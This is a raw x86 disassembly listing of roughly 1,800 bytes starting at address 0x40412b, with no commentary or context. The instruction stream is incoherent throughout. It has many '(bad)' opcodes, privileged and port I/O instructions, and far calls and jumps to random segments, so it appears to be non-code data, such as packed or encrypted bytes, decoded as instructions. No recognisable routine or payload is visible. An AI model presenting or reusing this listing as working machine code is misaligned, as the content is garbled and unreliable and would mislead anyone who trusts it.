  40412b:	xchg   DWORD PTR ds:0xbea96d9d,edi
  404131:	fcom   DWORD PTR [esi]
  404133:	(bad)  
  404134:	dec    ch
  404136:	shl    bh,1
  404138:	add    DWORD PTR [edi+edx*2-0x7d2e3ff3],edi
  40413f:	jp     0x4040ea
  404141:	jecxz  0x404129
  404143:	mov    ebp,0x8c8c927
  404148:	scas   eax,DWORD PTR es:[edi]
  404149:	jp     0x404111
  40414b:	cld    
  40414c:	pop    eax
  40414d:	fstp   TBYTE PTR [ebp-0x77]
  404150:	mov    ah,0x87
  404152:	cmp    DWORD PTR [ebx+eiz*8-0x51d05417],0xffffff94
  40415a:	stos   DWORD PTR es:[edi],eax
  40415b:	mov    cs,WORD PTR [esi+ecx*8+0x29]
  40415f:	outs   dx,DWORD PTR ds:[esi]
  404160:	fst    st(6)
  404162:	(bad)  
  404163:	adc    BYTE PTR [ecx-0x40],al
  404166:	inc    esi
  404167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404168:	pop    ebp
  404169:	int3   
  40416a:	dec    esi
  40416b:	cwde   
  40416c:	and    esp,DWORD PTR [ebx]
  40416e:	jnp    0x4040f6
  404170:	fs dec esi
  404172:	xor    cl,bh
  404174:	mov    ebx,0x5bca7e4
  404179:	pop    edi
  40417a:	retf   0x5bd1
  40417d:	les    ecx,FWORD PTR [esi-0x11]
  404180:	inc    esp
  404181:	test   bl,bl
  404183:	or     BYTE PTR [ebx],0x41
  404186:	add    DWORD PTR [eax+0x54],ebp
  404189:	pop    ds
  40418a:	call   0x3b0e:0xc01f1c22
  404191:	mov    DWORD PTR [ebp-0x4c],0x1325f2c6
  404198:	adc    BYTE PTR [edi+0x1c87999],ah
  40419e:	mov    al,0x30
  4041a0:	scas   al,BYTE PTR es:[edi]
  4041a1:	aas    
  4041a2:	in     eax,0xb2
  4041a4:	gs mov ebp,0xb97c0a3e
  4041aa:	push   ebp
  4041ab:	xchg   edx,eax
  4041ac:	outs   dx,DWORD PTR ds:[esi]
  4041ad:	sbb    ebp,DWORD PTR [ecx+0x75f95829]
  4041b3:	sti    
  4041b4:	in     al,0xa0
  4041b6:	ja     0x4041c7
  4041b8:	test   al,0x7d
  4041ba:	in     eax,0x87
  4041bc:	push   edi
  4041bd:	add    dl,dl
  4041bf:	lock jl 0x40416b
  4041c2:	xor    edi,0x45a8fb88
  4041c8:	sar    DWORD PTR [ecx+eax*4],0x8f
  4041cc:	mov    ds:0x44c29863,al
  4041d1:	xor    cl,BYTE PTR [edx-0x36]
  4041d4:	xchg   ebx,eax
  4041d5:	mov    ds:0xcd50acc1,eax
  4041da:	pop    ebp
  4041db:	int    0x17
  4041dd:	and    eax,0x9ce64ff1
  4041e2:	jo     0x4041fb
  4041e4:	xlat   BYTE PTR ds:[ebx]
  4041e5:	lock mov ds:0x97ddf17d,eax
  4041eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ec:	xchg   ebp,eax
  4041ed:	loope  0x4041ed
  4041ef:	out    0x57,eax
  4041f1:	cmp    BYTE PTR [edx+0x10],ah
  4041f4:	call   0x57c3:0x482b6f47
  4041fb:	dec    ebx
  4041fc:	xor    ebx,edx
  4041fe:	je     0x4041b1
  404200:	fwait
  404201:	dec    esp
  404202:	div    BYTE PTR [ebx+0x3a]
  404205:	sbb    BYTE PTR [edx-0x5e],bh
  404208:	sbb    BYTE PTR [ebp-0x4],bl
  40420b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40420c:	(bad)  
  40420d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40420e:	mov    ah,0xb9
  404210:	invd   
  404212:	xlat   BYTE PTR ds:[ebx]
  404213:	scas   al,BYTE PTR es:[edi]
  404214:	hlt    
  404215:	xor    eax,0x8ffc6886
  40421a:	adc    bh,BYTE PTR [edx-0xc]
  40421d:	cmp    DWORD PTR [eax],ebx
  40421f:	xlat   BYTE PTR ds:[ebx]
  404220:	retf   
  404221:	dec    esi
  404222:	adc    BYTE PTR [esi+0x210a3e48],ah
  404228:	xor    dl,bl
  40422a:	and    DWORD PTR [esi+ecx*8+0x541b09ff],ebx
  404231:	xchg   BYTE PTR [eax],ah
  404233:	inc    ebp
  404234:	mul    DWORD PTR [ecx+edi*2-0x38]
  404238:	call   0x39b4:0x14eacdf3
  40423f:	ins    BYTE PTR es:[edi],dx
  404240:	in     eax,dx
  404241:	popa   
  404242:	or     eax,ebp
  404244:	dec    esi
  404245:	(bad)  
  404246:	and    edx,DWORD PTR [edx-0xe]
  404249:	(bad)  [ebx-0x6b30a7ed]
  40424f:	data16 jge 0x4041de
  404252:	fldenv [ebx+0x1a]
  404255:	dec    esi
  404256:	mov    BYTE PTR ds:0x445f4910,ch
  40425c:	xchg   DWORD PTR [edi-0x78],eax
  40425f:	sbb    eax,0xa92fab39
  404264:	cmp    al,ch
  404266:	sbb    BYTE PTR [eax-0x406c8916],dh
  40426c:	add    BYTE PTR [ebp+0x381943ab],dl
  404272:	sti    
  404273:	enter  0xf5,0xb0
  404277:	cld    
  404278:	sar    BYTE PTR [edi+0x3964be53],cl
  40427e:	jne    0x404207
  404280:	aaa    
  404281:	sti    
  404282:	std    
  404283:	mov    al,0xf4
  404285:	stos   DWORD PTR es:[di],eax
  404287:	(bad)  
  404288:	mov    bh,0x9f
  40428a:	cs pop eax
  40428c:	sbb    al,0x54
  40428e:	(bad)  [esi]
  404290:	push   edx
  404291:	push   es
  404292:	popf   
  404293:	dec    edi
  404294:	jmp    0x4042c6
  404296:	popf   
  404297:	imul   ebx,ecx,0xffffffdc
  40429a:	add    BYTE PTR [ebp+0x12],dl
  40429d:	(bad)  
  40429e:	in     al,0x20
  4042a0:	mov    esi,0xb4624d48
  4042a5:	sbb    ah,ch
  4042a7:	pushf  
  4042a8:	outs   dx,BYTE PTR ds:[esi]
  4042a9:	dec    esp
  4042aa:	push   eax
  4042ab:	scas   eax,DWORD PTR es:[edi]
  4042ac:	sbb    BYTE PTR es:[eax+eiz*8-0x64],dl
  4042b1:	xchg   esp,eax
  4042b2:	ret    0x99da
  4042b5:	fwait
  4042b6:	mov    bl,0x6f
  4042b8:	ds loop 0x404242
  4042bb:	out    dx,al
  4042bc:	cmp    ecx,ecx
  4042be:	stos   DWORD PTR es:[edi],eax
  4042bf:	xor    cl,BYTE PTR [ecx-0x2f]
  4042c2:	mov    DWORD PTR [edx-0x64ca50cc],edi
  4042c8:	cmc    
  4042c9:	mov    al,0x38
  4042cb:	jle    0x404255
  4042cd:	or     bh,BYTE PTR [esi-0x2f764c68]
  4042d3:	mov    al,ds:0xe69c2930
  4042d8:	pop    es
  4042d9:	xchg   edx,eax
  4042da:	repnz repnz add edi,DWORD PTR [ebx-0x5fe7979e]
  4042e2:	daa    
  4042e3:	adc    al,0xd9
  4042e5:	and    ah,BYTE PTR [ebp-0x17398946]
  4042eb:	mov    ebx,0x7f28c5e8
  4042f0:	ds je  0x4042aa
  4042f3:	adc    ch,ch
  4042f5:	pop    ss
  4042f6:	mov    bh,0x27
  4042f8:	retf   
  4042f9:	inc    ebx
  4042fa:	iret   
  4042fb:	inc    ebx
  4042fc:	cs push ss
  4042fe:	xor    al,0xc1
  404300:	pop    es
  404301:	(bad)  
  404302:	jmp    0x404287
  404304:	shl    DWORD PTR [ebp-0x2ad0c68],0xc9
  40430b:	mov    ds:0x9e076e6f,al
  404310:	sbb    eax,0x872aef09
  404315:	xor    eax,0xf308164d
  40431a:	add    BYTE PTR [edi+edi*1-0x49704f24],cl
  404321:	mov    esp,0x8899ac86
  404326:	fdivr  DWORD PTR [esi+0x41]
  404329:	out    dx,eax
  40432a:	scas   al,BYTE PTR es:[edi]
  40432b:	cmp    BYTE PTR [ebp-0x72995e84],dl
  404331:	mov    bh,0xf2
  404333:	push   esi
  404334:	loopne 0x4042d2
  404336:	lods   al,BYTE PTR ds:[esi]
  404337:	add    eax,0xcd4c3dbc
  40433c:	inc    esi
  40433d:	cmp    ecx,edi
  40433f:	lods   eax,DWORD PTR ds:[esi]
  404340:	cli    
  404341:	and    DWORD PTR [esi],0xffffffc6
  404344:	mov    eax,ds:0xd71d395d
  404349:	push   0x5f25f5f8
  40434e:	mov    edi,0x287f4051
  404353:	mov    edx,0xb97068f5
  404358:	fldenv [ecx]
  40435a:	sub    bl,al
  40435c:	sub    BYTE PTR [ebp+ecx*1+0x31],ah
  404360:	push   cs
  404361:	pop    ecx
  404362:	popf   
  404363:	mov    bl,BYTE PTR [esi+0x55]
  404366:	fwait
  404367:	pop    es
  404368:	jmp    0xf6b2:0xec69ed24
  40436f:	ins    DWORD PTR es:[edi],dx
  404370:	or     bl,dl
  404372:	cld    
  404373:	data16 (bad) 
  404375:	push   ss
  404376:	push   eax
  404377:	outs   dx,DWORD PTR ds:[esi]
  404378:	inc    edx
  404379:	dec    edi
  40437a:	inc    ebx
  40437b:	push   edi
  40437c:	jnp    0x4043fd
  40437e:	clc    
  40437f:	in     al,0x75
  404381:	lock push ebp
  404383:	mov    ds:0xe5eada68,eax
  404388:	xor    DWORD PTR [eax-0x64d86546],esi
  40438e:	xchg   esp,eax
  40438f:	adc    edx,DWORD PTR [ebp+0x73]
  404392:	(bad)  
  404393:	ins    DWORD PTR es:[edi],dx
  404394:	jno    0x40435f
  404396:	adc    al,0x80
  404398:	stos   BYTE PTR es:[edi],al
  404399:	inc    esp
  40439a:	pop    DWORD PTR [esi+0x48d81032]
  4043a0:	mov    esp,0xce466562
  4043a5:	cdq    
  4043a6:	test   BYTE PTR [edx-0x74a7f0e6],0xc0
  4043ad:	xchg   edx,eax
  4043ae:	mov    edi,0x5a142049
  4043b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b4:	dec    eax
  4043b5:	pop    es
  4043b6:	mov    BYTE PTR [edx-0x27],al
  4043b9:	mov    ecx,0xf8e72317
  4043be:	daa    
  4043bf:	test   BYTE PTR [ebx+0x3b20cfc4],0x3e
  4043c6:	mov    eax,0xf18f2d28
  4043cb:	les    ebx,FWORD PTR [edx+eax*2]
  4043ce:	jno    0x404354
  4043d0:	mov    ds:0xfbcb3474,al
  4043d5:	and    ebx,edi
  4043d7:	add    eax,0x4b624d8a
  4043dc:	or     eax,0x1bfa115e
  4043e1:	test   eax,0x769a36d
  4043e6:	jmp    0xb331:0x5e830e8c
  4043ed:	jb     0x40444b
  4043ef:	sbb    DWORD PTR [edx],eax
  4043f1:	mov    DWORD PTR [ebp+0x7f],eax
  4043f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f5:	mov    ch,BYTE PTR ds:0x6d6af5d3
  4043fb:	add    al,0x25
  4043fd:	inc    eax
  4043fe:	dec    esi
  4043ff:	mov    ebp,0xd3847b7c
  404404:	mov    ebp,0x564ec7cc
  404409:	outs   dx,BYTE PTR ds:[esi]
  40440a:	repnz sub eax,0xe25ce68c
  404410:	mov    edi,0xb28c5bbc
  404415:	cmp    ah,ch
  404417:	adc    ecx,esi
  404419:	lea    ebx,[esi+0x46722a1d]
  40441f:	mov    ds:0x5b4298d1,eax
  404424:	test   BYTE PTR ds:0x6c439960,ch
  40442a:	and    edi,edi
  40442c:	or     DWORD PTR [esi-0x7ddd594f],edx
  404432:	push   eax
  404433:	jle    0x40442c
  404435:	cmp    dh,BYTE PTR [ecx]
  404437:	es adc edx,esi
  40443a:	add    al,0x2d
  40443c:	jl     0x404496
  40443e:	pop    edi
  40443f:	aam    0xa9
  404441:	push   eax
  404442:	stos   DWORD PTR es:[edi],eax
  404443:	ficom  DWORD PTR [ecx]
  404445:	xchg   esp,eax
  404446:	push   esi
  404447:	xchg   edx,eax
  404448:	stos   DWORD PTR es:[edi],eax
  404449:	fisttp DWORD PTR [ebx]
  40444b:	jmp    0x635beba4
  404450:	stc    
  404451:	arpl   di,bp
  404453:	in     eax,0xae
  404455:	in     eax,0xe6
  404457:	(bad)  [esp+edx*1+0x2d39e14c]
  40445e:	ss inc ebx
  404460:	mov    esp,0xcf83ea1e
  404465:	pop    ss
  404466:	shr    BYTE PTR [ebx-0x24248f6b],1
  40446c:	jecxz  0x4044d2
  40446e:	stc    
  40446f:	outs   dx,BYTE PTR ds:[esi]
  404470:	out    dx,al
  404471:	clc    
  404472:	cmc    
  404473:	in     al,dx
  404474:	scas   al,BYTE PTR es:[edi]
  404475:	mov    cs,ebp
  404477:	fisttp DWORD PTR ds:[ebp-0x740382f]
  40447e:	mov    cl,0x20
  404480:	mov    dl,0xce
  404482:	(bad)  
  404483:	fst    st(4)
  404485:	js     0x4044f1
  404487:	cwde   
  404488:	mov    ds:0x8d248838,al
  40448d:	fs sub ah,BYTE PTR ss:[si]
  404492:	mov    ebp,0x1760c976
  404497:	cmp    bl,BYTE PTR [ecx]
  404499:	int    0x47
  40449b:	xchg   esp,eax
  40449c:	jns    0x404495
  40449e:	(bad)  
  40449f:	(bad)  
  4044a0:	sub    DWORD PTR [edi+0x39ce18e7],ebx
  4044a6:	test   BYTE PTR [eax+0x575691ce],bh
  4044ac:	mov    WORD PTR [edx],ss
  4044ae:	imul   edx,DWORD PTR [esi-0x5a96edf5],0xffffffce
  4044b5:	sbb    BYTE PTR [ecx-0x11],bh
  4044b8:	aaa    
  4044b9:	mov    ah,0x7a
  4044bb:	lock (bad) 
  4044bd:	sahf   
  4044be:	dec    edi
  4044bf:	cmp    DWORD PTR [edx+0x5e1f6d23],0xb3b3b0ef
  4044c9:	gs loope 0x404528
  4044cc:	imul   esi,DWORD PTR [edi-0x23],0x72
  4044d0:	and    BYTE PTR [ecx+ebp*2+0x29320770],ch
  4044d7:	mov    al,0xe4
  4044d9:	fiadd  DWORD PTR [ebp+0x2f]
  4044dc:	imul   edx,DWORD PTR [esi],0x7874cfb6
  4044e2:	sti    
  4044e3:	div    ch
  4044e5:	fwait
  4044e6:	pop    ebx
  4044e7:	fst    QWORD PTR [edx]
  4044e9:	mov    esi,0x5e0872f5
  4044ee:	loop   0x404476
  4044f0:	outs   dx,BYTE PTR ds:[esi]
  4044f1:	pop    esi
  4044f2:	daa    
  4044f3:	pop    es
  4044f4:	daa    
  4044f5:	popf   
  4044f6:	aas    
  4044f7:	jg     0x404573
  4044f9:	inc    ebp
  4044fa:	cld    
  4044fb:	pop    edi
  4044fc:	ds stos DWORD PTR es:[edi],eax
  4044fe:	repz fadd st,st(5)
  404501:	mov    edx,0x989aacb9
  404506:	clc    
  404507:	push   edx
  404508:	std    
  404509:	sub    al,0xa1
  40450b:	scas   eax,DWORD PTR es:[edi]
  40450c:	loopne 0x404509
  40450e:	add    dl,BYTE PTR [ebx]
  404510:	stos   DWORD PTR es:[edi],eax
  404511:	dec    esi
  404512:	pop    edi
  404513:	out    0x1f,al
  404515:	inc    ebx
  404516:	add    ah,BYTE PTR [edi]
  404518:	jbe    0x404594
  40451a:	enter  0xf1d3,0xd2
  40451e:	jle    0x404505
  404520:	adc    BYTE PTR [eax-0xce20ab3],bl
  404526:	outs   dx,BYTE PTR ds:[esi]
  404527:	and    eax,0x265cecb5
  40452c:	or     eax,0xebae9fbb
  404531:	push   edx
  404532:	rcr    bh,0xd4
  404535:	push   ebx
  404536:	jge    0x40450d
  404538:	pop    ecx
  404539:	inc    ebp
  40453a:	aaa    
  40453b:	adc    eax,0x18d5f5fb
  404540:	inc    ecx
  404541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404542:	test   eax,0xcc1f787a
  404547:	cmp    edi,DWORD PTR [ebp+0x6e]
  40454a:	adc    BYTE PTR [eax],cl
  40454c:	retf   0xab0f
  40454f:	iret   
  404550:	mov    bl,0xcb
  404552:	push   ecx
  404553:	stos   DWORD PTR es:[edi],eax
  404554:	adc    al,0xba
  404556:	xlat   BYTE PTR ds:[ebx]
  404557:	adc    al,0xdc
  404559:	ins    BYTE PTR es:[edi],dx
  40455a:	arpl   sp,bp
  40455c:	dec    esp
  40455d:	fcmovb st,st(3)
  40455f:	or     eax,0x96519d86
  404564:	mov    ebp,0x42b4074b
  404569:	out    dx,al
  40456a:	xchg   ebp,eax
  40456b:	sub    DWORD PTR [ecx-0x4b],ebx
  40456e:	test   al,0x30
  404570:	fs xchg esp,eax
  404572:	outs   dx,DWORD PTR ds:[esi]
  404573:	jno    0x4045ac
  404575:	test   al,0x31
  404578:	xlat   BYTE PTR ds:[ebx]
  404579:	imul   ebp,DWORD PTR [ebx],0xffffff81
  40457c:	fbld   TBYTE PTR ds:0x6580f04d
  404582:	sub    eax,0x98137a45
  404587:	pop    edx
  404588:	aas    
  404589:	in     al,0xe7
  40458b:	pop    esi
  40458c:	popa   
  40458d:	lahf   
  40458e:	fmul   QWORD PTR [edx-0x45]
  404591:	cs out dx,al
  404593:	and    edx,DWORD PTR [edx-0x22b37d4e]
  404599:	jle    0x40456f
  40459b:	sbb    al,0xdc
  40459d:	and    BYTE PTR [ebx-0x15],dl
  4045a0:	fidivr WORD PTR [ebx]
  4045a2:	aam    0x3b
  4045a4:	lock popa 
  4045a6:	jnp    0x404577
  4045a8:	pop    ebx
  4045a9:	(bad)  
  4045aa:	ret    0x34b8
  4045ad:	ss jg  0x4045f7
  4045b0:	mov    dh,0x55
  4045b2:	(bad)  
  4045b4:	rcr    BYTE PTR [edi],0x4f
  4045b7:	xchg   ecx,eax
  4045b8:	inc    esp
  4045b9:	jbe    0x404592
  4045bb:	jg     0x4045cf
  4045bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045be:	ficom  WORD PTR [edi]
  4045c0:	sar    BYTE PTR [ebx-0x7],cl
  4045c3:	jp     0x404636
  4045c5:	cmp    al,0xb5
  4045c7:	adc    al,0xad
  4045c9:	pop    esi
  4045ca:	inc    ebp
  4045cb:	shl    BYTE PTR [ebx-0x355f0e80],1
  4045d1:	je     0x404554
  4045d3:	in     eax,0xf
  4045d5:	popf   
  4045d6:	xor    al,0xc2
  4045d8:	into   
  4045d9:	sbb    al,0xb6
  4045db:	test   BYTE PTR [ecx-0x2b4976b4],bl
  4045e1:	in     eax,0x9e
  4045e3:	sbb    edi,DWORD PTR [eax-0x7c18d244]
  4045e9:	cmp    DWORD PTR [ecx+0x10],eax
  4045ec:	mov    edi,?
  4045ee:	dec    ebp
  4045ef:	and    al,0xc9
  4045f1:	add    bh,ah
  4045f3:	stc    
  4045f4:	icebp  
  4045f5:	mov    ds:0x8832ce03,eax
  4045fa:	jecxz  0x404581
  4045fc:	imul   ebp,DWORD PTR [ecx-0x48ce0b85],0x31ce2bd9
  404606:	inc    edx
  404607:	xchg   DWORD PTR [esi+0x54],ebp
  40460a:	xchg   ch,cl
  40460c:	or     DWORD PTR [ebx-0x5cac46eb],0x23a8b47e
  404616:	push   ebx
  404617:	fcmovu st,st(0)
  404619:	sub    eax,0x5b5d3218
  40461e:	aas    
  40461f:	dec    ecx
  404620:	sub    ch,BYTE PTR [edx+0x54]
  404623:	test   BYTE PTR [edx-0x16],dl
  404626:	das    
  404627:	pop    edx
  404628:	in     eax,0xf9
  40462a:	jo     0x404670
  40462c:	add    ebp,DWORD PTR [esp+ecx*4]
  40462f:	add    al,0xab
  404631:	pop    ebx
  404632:	mov    ch,0x7e
  404634:	repnz aad 0x34
  404637:	ins    BYTE PTR es:[edi],dx
  404638:	dec    edx
  404639:	cmp    eax,0x68f7757b
  40463e:	into   
  40463f:	pop    edi
  404640:	or     DWORD PTR [esp+eiz*2+0x53],0xdd2d2b28
  404648:	loope  0x4045d6
  40464a:	fnstsw WORD PTR [ebx-0x11]
  40464d:	not    DWORD PTR [ecx+0x3b]
  404650:	cdq    
  404651:	out    0x3,eax
  404653:	scas   al,BYTE PTR es:[edi]
  404654:	aas    
  404655:	shr    BYTE PTR ds:0xd90237e6,1
  40465b:	mov    cl,0xd3
  40465d:	dec    esp
  40465e:	inc    ebp
  40465f:	stc    
  404660:	sahf   
  404661:	icebp  
  404662:	fcomp  QWORD PTR [edx+edx*1-0x7f]
  404666:	fiadd  DWORD PTR [esi+ecx*1]
  404669:	gs cmp al,0x3e
  40466c:	and    al,bh
  40466e:	xchg   esp,edx
  404670:	jg     0x40460a
  404672:	int    0xfe
  404674:	jge    0x4046db
  404676:	test   BYTE PTR [esi-0x22c17656],0x64
  40467d:	sub    al,0x5d
  40467f:	out    0xf3,al
  404681:	popf   
  404682:	dec    edx
  404683:	cld    
  404684:	les    esi,FWORD PTR [esi+0x683c1dae]
  40468a:	mov    edx,0x376198cf
  40468f:	cld    
  404690:	sbb    DWORD PTR [ebx+0x1f],edx
  404693:	test   al,0x54
  404695:	mov    bl,0x46
  404697:	cmp    eax,0x79084de
  40469c:	int    0x8a
  40469e:	int    0xfc
  4046a0:	push   eax
  4046a1:	sub    edx,edx
  4046a3:	dec    ecx
  4046a4:	cli    
  4046a5:	outs   dx,BYTE PTR ds:[esi]
  4046a6:	jb     0x40462b
  4046a8:	sub    dl,BYTE PTR [ebx-0x5c]
  4046ab:	sbb    eax,DWORD PTR [ebx+eax*8]
  4046ae:	sbb    cl,bl
  4046b0:	cli    
  4046b1:	in     al,0xed
  4046b3:	in     eax,0x88
  4046b5:	mov    ds:0x19bd40a3,al
  4046ba:	fdivrp st(5),st
  4046bc:	stos   BYTE PTR es:[edi],al
  4046bd:	sub    eax,0x8f1e3556
  4046c2:	sahf   
  4046c3:	or     cl,BYTE PTR [esi+0x24939c7]
  4046c9:	jo     0x4046f3
  4046cb:	and    eax,0x765d5247
  4046d0:	das    
  4046d1:	push   ebx
  4046d2:	or     BYTE PTR [ebp-0x6e],ah
  4046d5:	sbb    BYTE PTR [esi],bl
  4046d7:	jle    0x4046bc
  4046d9:	push   ebp
  4046da:	or     al,0x89
  4046dc:	xchg   ecx,eax
  4046dd:	(bad)  
  4046de:	push   ss
  4046df:	(bad)  
  4046e0:	push   ebp
  4046e1:	call   0x4af8793c
  4046e6:	imul   eax,DWORD PTR [eax-0x58f10168],0xf8eee00a
  4046f0:	xchg   ecx,eax
  4046f1:	sahf   
  4046f2:	dec    ebx
  4046f3:	int    0x40
  4046f5:	pop    esi
  4046f6:	ret    0xc502
  4046f9:	pop    edx
  4046fa:	stc    
  4046fb:	lods   eax,DWORD PTR ds:[esi]
  4046fc:	imul   edi,edx,0xaad3fe3a
  404702:	into   
  404703:	lock and eax,0x9c727884
  404709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40470a:	imul   esp,DWORD PTR [edi-0x4f],0xdca6c818
  404711:	inc    edi
  404712:	repnz push edi
  404714:	pusha  
  404715:	shr    BYTE PTR [eax-0x5a],1
  404718:	(bad)  
  404719:	cmc    
  40471a:	gs ret 
  40471c:	mov    bl,0xe5
  40471e:	mov    cs,esp
  404720:	jns    0x40475b
  404722:	lods   al,BYTE PTR ds:[esi]
  404723:	mov    al,0x6b
  404725:	adc    ch,BYTE PTR [ecx]
  404727:	iret   
  404728:	aaa    
  404729:	xchg   edx,eax
  40472a:	fisttp QWORD PTR [esi]
  40472c:	lock test BYTE PTR [edi-0x4a],0x94
  404731:	cmp    dh,dl
  404733:	fcomp  DWORD PTR [ebx]
  404735:	xor    al,0x65
  404737:	cwde   
  404738:	or     eax,0x5dac66e
  40473d:	fidivr WORD PTR [edx]
  40473f:	stc    
  404740:	fnstcw WORD PTR [esi+0x108036ba]
  404746:	jnp    0x404700
  404748:	or     al,0x4a
  40474a:	mov    al,ds:0x59ac1247
  40474f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404750:	mov    dh,0xac
  404752:	xlat   BYTE PTR ds:[ebx]
  404753:	sub    al,0x1d
  404755:	aad    0x7d
  404757:	test   al,0x3b
  404759:	adc    BYTE PTR [ebx-0x3e3d648a],dl
  40475f:	test   eax,0x39999dd0
  404764:	pop    eax
  404765:	popa   
  404766:	nop
  404767:	sbb    al,0x48
  404769:	mov    dl,al
  40476b:	sub    DWORD PTR fs:[eax+edi*1-0x5e],esi
  404770:	and    al,bl
  404772:	push   edx
  404773:	loopne 0x404707
  404775:	sub    esp,DWORD PTR [esi-0x1717199c]
  40477b:	mov    edx,0x30b2f905
  404780:	inc    ebp
  404781:	pop    ss
  404782:	jg     0x40471d
  404784:	and    ah,bl
  404786:	scas   eax,DWORD PTR es:[edi]
  404787:	mov    ebx,DWORD PTR [esi]
  404789:	jmp    0x404729
  40478b:	pop    ebp
  40478c:	pop    ebx
  40478d:	imul   ebp,DWORD PTR [esi+0x624ce73f],0xb42f494
  404797:	inc    DWORD PTR [edx]
  404799:	arpl   WORD PTR [edi],sp
  40479b:	test   dl,0xec
  40479e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40479f:	cmp    eax,0x9596f3ba
  4047a4:	cld    
  4047a5:	mov    cl,BYTE PTR [ecx]
  4047a7:	and    BYTE PTR [eax-0x3a928bba],bl
  4047ad:	imul   esi,DWORD PTR ds:0x3dde9681,0x2e
  4047b4:	xor    ebp,DWORD PTR [ebp+edi*8+0x48]
  4047b8:	add    ch,dl
  4047ba:	cmp    BYTE PTR [edi+0x3],ch
  4047bd:	or     ebp,DWORD PTR [ebx-0x658dddd6]
  4047c3:	shl    BYTE PTR [edx-0x5513de2c],0x4b
  4047ca:	or     esi,DWORD PTR [ecx+0x31ee6a22]
  4047d0:	cmp    eax,0xe5983bd
  4047d5:	ins    BYTE PTR es:[edi],dx
  4047d6:	jge    0x404830
  4047d8:	xor    eax,ebp
  4047da:	outs   dx,DWORD PTR ds:[esi]
  4047db:	pop    ebx
  4047dc:	(bad)  
  4047de:	mov    eax,ds:0x318769e5
  4047e3:	mov    ah,0xe4
  4047e5:	mov    DWORD PTR [edi-0x4a55f56d],ebx
  4047eb:	fcom   DWORD PTR [edi]
  4047ed:	jnp    0x4047d8
  4047ef:	(bad)  
  4047f0:	xor    BYTE PTR ds:0x8e43b984,ah
  4047f6:	or     DWORD PTR [ebx+0x70679071],edx
  4047fc:	(bad)  
  4047fd:	repnz fstp QWORD PTR [esi+0x2eb55b4d]
  404804:	mov    ebx,0x78a4f969
  404809:	scas   al,BYTE PTR es:[edi]
  40480a:	leave  
  40480b:	push   0xb0b1fc07
  404810:	jne    0x4047fa
  404812:	pop    ds
  404813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404814:	test   eax,0x55b9ab1b
  404819:	or     eax,0x3a287425
  40481e:	repz mov ch,0x6f
  404821:	cmp    ebx,ebx
  404823:	xchg   esp,eax
  404824:	inc    esp
  404825:	jo     0x40485c
  404827:	push   edx
  404828:	(bad)  
  40482a:	out    0x1e,eax
  40482c:	test   BYTE PTR [ebx+0x13],dl
  40482f:	mov    bh,0xe7
  404831:	adc    eax,0x8c9fbf26
  404836:	xchg   esi,eax
  404837:	mov    bh,0x64
  404839:	int3   
  40483a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40483b:	push   ecx
  40483c:	shr    BYTE PTR [esi+0x1c],1
  40483f:	call   0xf4695db5
  404844:	daa    
  404845:	cmp    eax,0xc8758c04
  40484a:	sti    
  40484b:	ja     0x404858
  40484d:	mov    eax,DWORD PTR [esi+ebp*4]
  404850:	xor    dl,bh
  404852:	or     eax,0xe715c2d5
  404857:	adc    al,0x1b
  404859:	loop   0x40487f
  40485b:	pop    esi
  40485c:	mov    bh,0xa4
  40485e:	push   ss
  40485f:	sbb    BYTE PTR [ecx+ecx*8-0x1e],cl
  404863:	call   0xbef2:0xa0fffd81
  40486a:	lea    ebx,[ebp+ebx*8+0x24]
  40486e:	(bad)  
  40486f:	shl    edx,1
  404871:	js     0x40480a
  404873:	daa    
  404874:	push   ds
  404875:	sbb    BYTE PTR [edx],bl
  404877:	fcomp  DWORD PTR [edx+0x6998a7b4]
  40487d:	stc    
  40487e:	outs   dx,DWORD PTR ds:[esi]
  40487f:	pop    ecx
  404880:	mov    esi,0x8c1ba7e
  404885:	hlt    
  404886:	inc    ebx
  404887:	inc    eax
  404888:	pop    ebx
  404889:	not    edi
  40488b:	outs   dx,DWORD PTR ds:[esi]
  40488c:	sub    bh,bl
  40488e:	sbb    dh,bh
  404890:	call   0x13f8f275
  404895:	jbe    0x4048a5
  404897:	cmp    al,0x3c
  404899:	dec    BYTE PTR [ecx+0x383e96ae]
  40489f:	repz mov bl,0x43
  4048a2:	jecxz  0x4048a0
  4048a4:	cdq    
  4048a5:	iret   
  4048a6:	and    al,0xe1
  4048a8:	add    DWORD PTR [ecx-0x2f257569],0x32dc1828
  4048b2:	xchg   BYTE PTR [edi+ecx*1-0x1d],ah
  4048b6:	cmp    BYTE PTR [ecx+ebp*1+0x31876039],ah
  4048bd:	mov    ecx,DWORD PTR [esi]
  4048bf:	fist   DWORD PTR [ecx+0x1c8b310d]
  4048c5:	and    BYTE PTR [eax+0x4fd34b81],bl
  4048cb:	mov    eax,ds:0x3700aa36
  4048d0:	sbb    esp,DWORD PTR [esi-0x61d599ca]
  4048d6:	and    eax,0x5c4d66f
  4048db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048dc:	sbb    DWORD PTR [eax-0x1fdb80e3],esp
  4048e2:	jnp    0x4048d7
  4048e4:	sbb    bh,ah
  4048e6:	cmp    ebp,DWORD PTR [ebp-0x4d64feba]
  4048ec:	inc    BYTE PTR [edx-0x39]
  4048ef:	sub    DWORD PTR [ebx-0x2afb785d],ebx
  4048f5:	add    al,0xaa
  4048f7:	push   edi
  4048f8:	mov    bh,0xbd
  4048fa:	call   0xff49:0xbbacf879
  404901:	shl    DWORD PTR [ebx-0x4d625774],0x90
  404908:	les    ebx,FWORD PTR [ecx+0x759b32e4]
  40490e:	leave  
  40490f:	(bad)  
  404910:	icebp  
  404911:	data16 mov ch,0xdb
  404914:	push   ds
  404915:	fcom   QWORD PTR [eax-0x57c6eb98]
  40491c:	jb     0x40497d
